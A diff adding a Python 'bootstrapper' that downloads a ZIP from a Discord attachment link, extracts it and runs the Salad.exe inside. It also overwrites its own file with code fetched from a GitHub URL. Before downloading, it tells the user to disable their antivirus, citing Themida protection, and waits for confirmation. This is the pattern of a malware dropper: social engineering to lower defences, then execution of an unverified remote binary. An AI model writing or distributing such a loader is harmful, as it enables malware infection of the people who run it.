@@ -1,1 +1,163 @@
 bootstrapperver = 1
+import subprocess
+
+def compatibilitycheck():
+    requiredlibs = ["requests", "tqdm"]
+    missinglibs = [lib for lib in requiredlibs if lib not in globals()]
+
+    if missinglibs:
+        for lib in missinglibs:
+            subprocess.call(['pip', 'install', lib])
+
+def interpolate(startcolor, endcolor, ratio):
+    r = int(startcolor[0] + (endcolor[0] - startcolor[0]) * ratio)
+    g = int(startcolor[1] + (endcolor[1] - startcolor[1]) * ratio)
+    b = int(startcolor[2] + (endcolor[2] - startcolor[2]) * ratio)
+    return r, g, b
+
+def gradient(text, startcolor, endcolor):
+    colorstep = 1 / len(text)
+
+    gradient = ""
+    for i, char in enumerate(text):
+        ratio = i * colorstep
+        color = interpolate(startcolor, endcolor, ratio)
+        gradient += f"\033[38;2;{color[0]};{color[1]};{color[2]}m{char}\033[0m"
+    return gradient
+
+compatibilitycheck()
+import os
+import requests
+import zipfile
+import shutil
+import sys
+import tqdm  
+
+def updatecheck():
+    startcolor = (50, 205, 50)
+    endcolor = (34, 139, 34)
+    try:
+        response = requests.get("https://raw.githubusercontent.com/Insalad/bootstrapper/main/mainfile")
+        if response.status_code == 200:
+            latestversionline = response.text.strip().split("\n")[0]
+            latestversion = latestversionline.split("=")[1].strip()
+            if str(bootstrapperver) < latestversion:
+                return latestversion
+    except Exception as e:
+        print(gradient(f"Error checking for update: {e}", (255, 0, 0), (255, 0, 0)))
+    return None
+
+def updatescript():
+    try:
+        response = requests.get("https://raw.githubusercontent.com/Insalad/bootstrapper/main/mainfile")
+        if response.status_code == 200:
+            with open(__file__, "w") as file:
+                file.write(response.text)
+            return True
+    except Exception as e:
+        print(gradient(f"Error updating: {e}", (255, 0, 0), (255, 0, 0)))
+    return False
+
+def runupdatechecker():
+    latestversion = updatecheck()
+    if latestversion:
+        startcolor = (0, 255, 0)
+        endcolor = (0, 150, 0)
+        updatemessage = gradient(f"A new version of the bootstrapper was found, current version: {bootstrapperver} latest version {latestversion}, updating..",startcolor, endcolor)
+        print(updatemessage)
+        if updatescript():
+            print(gradient("Updated successfully. Please restart the bootstrapper", startcolor, endcolor))
+            exit()
+        else:
+            print(gradient("Failed to update.", (255, 0, 0), (255, 0, 0)))
+            exit()
+    else:
+        print("okokokokokokokokokokokokokokokokokokokokokokok")
+
+runupdatechecker()
+
+def downloadfunc(url, dest):
+    response = requests.get(url, stream=True)
+    total_size = int(response.headers.get('content-length', 0))
+    with open(dest, 'wb') as file, tqdm.tqdm(
+        desc=dest,
+        total=total_size,
+        unit='B',
+        unit_scale=True,
+        unit_divisor=1024,
+    ) as bar:
+        for chunk in response.iter_content(chunk_size=8192):
+            file.write(chunk)
+            bar.update(len(chunk))
+
+def extractfunc(filepath, extract):
+    with zipfile.ZipFile(filepath, 'r') as zip_ref:
+        total_files = len(zip_ref.namelist())
+        with tqdm.tqdm(total=total_files, desc="Extracting files", unit="file") as bar:
+            for member in zip_ref.namelist():
+                zip_ref.extract(member, extract)
+                bar.update(1)
+
+def deletefunc(path):
+    if os.path.isfile(path):
+        os.remove(path)
+    elif os.path.isdir(path):
+        shutil.rmtree(path)
+
+def runfunc(filepath, dir):
+    process = subprocess.Popen(filepath, cwd=dir, shell=True)
+
+os.system('cls' if os.name == 'nt' else 'clear')
+print(gradient(
+"""
+ ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓███████▓▒░  
+░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░                                                                                                                                                                                                                   
+""", 
+(0, 102, 255), (102, 0, 204)))
+saladurl = "https://cdn.discordapp.com/attachments/1247578618389860463/1272601741300338809/Salad.zip?ex=66bd8c7a&is=66bc3afa&hm=8ada363b06f741c88574dc09b7e4b0476368f765e878e932b416f5bf038318d5"
+downloaddir = os.path.expanduser("~/Downloads")
+saladzip = os.path.join(downloaddir, "Salad.zip")
+saladfolder = os.path.join(downloaddir, "Salad")
+saladexe = os.path.join(saladfolder, "Salad.exe")
+startcolor = (0, 102, 255)
+endcolor = (102, 0, 204)
+
+if os.path.exists(saladexe):
+    print(gradient("Salad is already installed", startcolor,endcolor))
+    runfunc(saladexe, saladfolder)
+    sys.exit()
+
+if os.path.exists(saladzip) or os.path.exists(saladfolder):
+    deletefunc(saladzip)
+    deletefunc(saladfolder)
+
+print(gradient("Disable the antivirus before downloading.",startcolor,endcolor))
+print(gradient("-------------",startcolor,endcolor))
+print(gradient("Why? Salad is protected with Themida. Themida is an advanced software protection system that uses code obfuscation, anti-debugging, and virtual machine protection to prevent reverse engineering and tampering.",startcolor,endcolor))
+print(gradient("-------------",startcolor,endcolor))
+input(gradient("Press any key to continue after disabling the antivirus...",startcolor,endcolor))
+
+print(gradient("Downloading Salad.zip...",startcolor,endcolor))
+downloadfunc(saladurl, saladzip)
+
+print(gradient("Extracting Salad.zip...",startcolor,endcolor))
+tempextract = os.path.join(downloaddir, "temp_Salad_extract")
+extractfunc(saladzip, tempextract)
+
+os.makedirs(saladfolder)
+for item in os.listdir(tempextract):
+    shutil.move(os.path.join(tempextract, item), saladfolder)
+
+deletefunc(tempextract)
+
+if os.path.exists(saladexe):
+    print(gradient("Installation finished.",(0, 255, 0), (0, 255, 0)))
+    runfunc(saladexe, saladfolder)
+    sys.exit()
+else:
+    print(gradient("Installation failed [Salad.exe not found]",(255, 0, 0), (255, 0, 0)))
